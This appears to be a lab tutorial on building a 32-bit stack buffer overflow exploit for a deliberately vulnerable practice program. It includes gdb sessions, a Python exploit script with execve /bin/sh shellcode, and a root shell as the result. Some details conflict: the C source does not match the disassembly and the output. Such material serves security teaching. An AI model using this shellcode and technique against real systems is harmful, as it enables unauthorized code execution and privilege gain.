# Development of a buffer overflow exploit - 32 bit

## Introduction

We will create a functional exploit for a 32 bit program with a stack overflow vulnerability. This includes
finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
python program

## Goal

* Implement a fully working exploit
* Get our static and dynamic analysis skills to the next level

## Prepared Files

There are three files prepared. We work mostly on the main file:
* challenge11-exploit-skel.py (main exploit skeletton file)

There are also prepared exploits for the program running in gdb, and without gdb:
* challenge11-exploit-gdb.py
* challenge11-exploit-final.py


## Source

File: `~/challenges/challenge11/challenge11.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

// hash of: "ourteacheristehbest"
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
	char *hash;

	// $6$ is SHA256
	hash = crypt(password, "$6$saaaaalty");

	if (strcmp(hash, adminHash) == 0) {
		return 1;
	} else {
		return 0;
	}
}


void handleData(char *username, char *password) {
	int isAdmin = 0;
	char firstname[64];

	isAdmin = checkPassword(password);
	strcpy(firstname, username);

	if(isAdmin > 0) {
		printf("You ARE admin!\nBe the force with you.\n");
	} else {
		printf("You are not admin.\nLame.\n");
	}
}


int main(int argc, char **argv) {
	if (argc != 3) {
		printf("Call: %s <name> <password>\n", argv[0]);
		exit(0);
	}

	handleData(argv[1], argv[2]);
}
```

You can compile it by calling `make` in the folder `~/challenges/challenge11`

## Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
	[...]
	char firstname[64];

	[...]
	strcpy(firstname, username);
	[...]
}


int main(int argc, char **argv) {
	[...]
	handleData(argv[1], argv[2]);
}
```

The second argument of the program is copied into a stack buffer of 64 byte size.



## Analysis

```
$ file challenge11
vulnerable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f6b1aab172bde7f561e30ef84f253da4a081d8d7, not stripped
```



## Normal behaviour

Run Programm with `AAAAAAAAAAA asdf` as parameter.

```
root@hlUbuntu32:~/challenges/challenge11# gdb -q challenge11
Reading symbols from challenge11...(no debugging symbols found)...done.
(gdb) run AAAAAAAAAAA asdf
Starting program: /root/challenges/challenge11/challenge11 AAAAAAAAAAA asdf
Hello cmd-AAAAAAAAAAA.
You are not admin.
isAdmin: 0x0
[Inferior 1 (process 454) exited normally]
(gdb)
```

## Find offset

Lets Crash program with 90 x "A" + 4 x "B".

Re-run the programm with overlong arguments; you see some 0x4141 on the stack (Hex code for A). Nothing to see from the 4x"B".

```sh
(gdb) run `python -c 'print "A" * 90 + "BBBB"'` test
Starting program: /root/challenges/challenge11/challenge11 `python -c 'print "A" * 90 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Looks like it is crashing with EIP=0x41414141. But we want to have EIP=0x42424242. Lets remove
some "A" bytes, and try again:

Crash program with 76 x "A":
```
(gdb) run `python -c 'print "A" * 76 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge11/challenge11 `python -c 'print "A" * 76 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Perfect, EIP is exactly 0x42424242. Therefore, the offset is 76 bytes.

## Find buffer base address

We need to find the address of the buffer where our shellcode is stored.
This buffer is `argv[1]`, or `char *username` in the function `handleData()`.

Therefore we can just break anywhere in `handleData()`, and print the address
of the `username` parameter.

Check disassembly of handleData:
```sh
root@hlUbuntu32aslr:~/challenges/challenge11# gdb -q vulnerable
Reading symbols from vulnerable...(no debugging symbols found)...done.
(gdb) disas handleData
Dump of assembler code for function handleData:
   0x080485bd <+0>:	push   ebp
   0x080485be <+1>:	mov    ebp,esp
   0x080485c0 <+3>:	sub    esp,0x58
   0x080485c3 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080485ca <+13>:	sub    esp,0xc
   0x080485cd <+16>:	push   DWORD PTR [ebp+0xc]
   0x080485d0 <+19>:	call   0x804857b <checkPassword>
   0x080485d5 <+24>:	add    esp,0x10
   0x080485d8 <+27>:	mov    DWORD PTR [ebp-0xc],eax
   0x080485db <+30>:	push   DWORD PTR [ebp+0x8]
   0x080485de <+33>:	push   0x8048781
   0x080485e3 <+38>:	push   0x8048785
   0x080485e8 <+43>:	lea    eax,[ebp-0x4c]
   0x080485eb <+46>:	push   eax
   0x080485ec <+47>:	call   0x8048460 <sprintf@plt>
   0x080485f1 <+52>:	add    esp,0x10
   0x080485f4 <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080485f8 <+59>:	jle    0x8048613 <handleData+86>
   0x080485fa <+61>:	sub    esp,0x4
   0x080485fd <+64>:	push   DWORD PTR [ebp-0xc]
   0x08048600 <+67>:	lea    eax,[ebp-0x4c]
   0x08048603 <+70>:	push   eax
   0x08048604 <+71>:	push   0x804878c
   0x08048609 <+76>:	call   0x8048420 <printf@plt>
   0x0804860e <+81>:	add    esp,0x10
   0x08048611 <+84>:	jmp    0x804862a <handleData+109>
   0x08048613 <+86>:	sub    esp,0x4
   0x08048616 <+89>:	push   DWORD PTR [ebp-0xc]
   0x08048619 <+92>:	lea    eax,[ebp-0x4c]
   0x0804861c <+95>:	push   eax
   0x0804861d <+96>:	push   0x80487b4
   0x08048622 <+101>:	call   0x8048420 <printf@plt>
   0x08048627 <+106>:	add    esp,0x10
   0x0804862a <+109>:	nop
   0x0804862b <+110>:	leave  
   0x0804862c <+111>:	ret    
End of assembler dump.
```

Set Breakpoint in GDB. We can break anywhere in the function, lets say at
`0x080485c3`
```
(gdb) b *0x080485c3
Breakpoint 1 at 0x080485c3
```

Run it with the parameter "AAAAAAAA test":

```
(gdb) run AAAAAAAA test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge11/challenge11 AAAAAAAA test

Breakpoint 1, 0x080485c3 in handleData ()

(gdb) x/1xw $ebp+0x8
0xffffd670:     0xffffd87e
(gdb) x/4xw 0xffffd87e
0xffffd87e:     0x41414141      0x41414141      0x73657400      0x45540074
```

The first parameter is stored at `EBP+0x8`. Or to be more specific, the address
of the first parameter. This address is `0xffffd87e`. Then we can check if this
address really points to our future shellcode.


## Create an exploit

The prepared exploit skeleton is available at the file `challenge11-exploit-skel.py`:
```
#!/usr/bin/python
# Skeleton exploit for challenge11
import sys

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buf_size = 64
offset = ??

ret_addr = "\x??\x??\x??\x??"

# fill up to 64 bytes
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

# garbage between buffer and RET
exploit += "A" * (offset - len(exploit))

# add ret
exploit += ret_addr

# print to stdout
sys.stdout.write(exploit)
```


Lets insert the correct values:

```
#!/usr/bin/python
# Skeleton exploit for challenge11
import sys

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buf_size = 64
offset = 76

ret_addr = "\x7e\xd8\xff\xff"

# fill up to 64 bytes
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

# garbage between buffer and RET
exploit += "A" * (offset - len(exploit))

# add ret
exploit += ret_addr

# print to stdout
sys.stdout.write(exploit)
```


## Test exploit


Lets try our new exploit:
```
(gdb) run `python challenge11-exploit-skel.py` test
Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
Hello cmd-...
You are not admin.
isAdmin: 0x80cd0bb0

Program received signal SIGILL, Illegal instruction.
0xffffd884 in ?? ()
```

Hmm, something went wrong. It seems that EIP does not point to valid assembler instructions.
Lets confirm it:

```
(gdb) i r eip
eip            0xffffd884       0xffffd884
(gdb) x/8i 0xffffd884
=> 0xffffd884:  (bad)
   0xffffd885:  incl   (%eax)
   0xffffd887:  je     0xffffd8ee
   0xffffd889:  jae    0xffffd8ff
   0xffffd88b:  add    %dl,0x52(%ebp,%eax,2)
   0xffffd88f:  dec    %ebp
   0xffffd890:  cmp    $0x72657478,%eax
   0xffffd895:  insl   (%dx),%es:(%edi)
```

This does not look right. Lets check the position of our shellcode, `0xffffd87e`:
```
(gdb) x/4x 0xffffd87e
0xffffd87e:     0x41414141      0xffffd87e      0x73657400      0x45540074
```

This is not our shellcode. Lets repeat step "Find buffer base address":

```
(gdb) b *0x080485c3
Breakpoint 1 at 0x80485c3
(gdb) run `python challenge11-exploit-skel.py` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test

Breakpoint 1, 0x080485c3 in handleData ()
(gdb) x/1xw $ebp+0x8
0xffffd620:     0xffffd836
(gdb) x/4xw 0xffffd836
0xffffd836:     0x90909090      0x90909090      0x90909090      0x90909090
```

It seems that now, our shellcode is located at address `0xffffd836`. Most likely
because the shellcode is much longer than the original parameter, libc moved everything
around a bit. Lets update our exploit yet again, and try it again.

## Test exploit again

Update the exploit:

Replace:
```
ret_addr = "\x7e\xd8\xff\xff"
```

with:
```
ret_addr = "\x36\xd8\xff\xff"
```

Lets try again:
```
(gdb) run `python challenge11-exploit-skel.py` test
Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
Hello cmd-...
You are not admin.
isAdmin: 0x80cd0bb0
process 572 is executing new program: /bin/dash
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Success!


## Test exploit without gdb

Lets test it without gdb:

```
root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
Hello cmd-...
You are not admin.
isAdmin: 0x80cd0bb0
Segmentation fault (core dumped)
```

Ouch, no shell. We have the analyze the core file.

```
root@hlUbuntu32:~/challenges/challenge11# ulimit -c unlimited
root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
Hello cmd-...
You are not admin.
isAdmin: 0x80cd0bb0
Segmentation fault (core dumped)
```

This will generate a corefile
```
root@hlUbuntu32:~/challenges/challenge11# gdb -q challenge11 core
Reading symbols from challenge11...(no debugging symbols found)...done.
[New LWP 14378]
Core was generated by `./challenge11...
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd836 in ?? ()
(gdb) x/8x $eip
0xffffd836:     0x00000000      0x00000000      0x68632f2e      0x656c6c61
0xffffd846:     0x3165676e      0x90900031      0x90909090      0x90909090
```

We can simple look where EIP is pointing, and realize that the actual shellcode
seems to be several bytes behind the current EIP (0x90909090).

```
(gdb) x/8x $eip+0x16
0xffffd84c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd85c:     0x90909090      0x90909090      0x90909090      0x90909090
```

Therefore, lets adjust the exploit once again:

Replace:
```
ret_addr = "\x36\xd8\xff\xff"
```

with:
```
ret_addr = "\x4c\xd8\xff\xff"
```

```
root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
Hello cmd-...
You are not admin.
isAdmin: 0x80cd0bb0
#
```


## Questions

* Can you create an exploit which works with, and without GDB?
* Can you create an exploit where the shellcode is stored in the variable password (argv[2])?
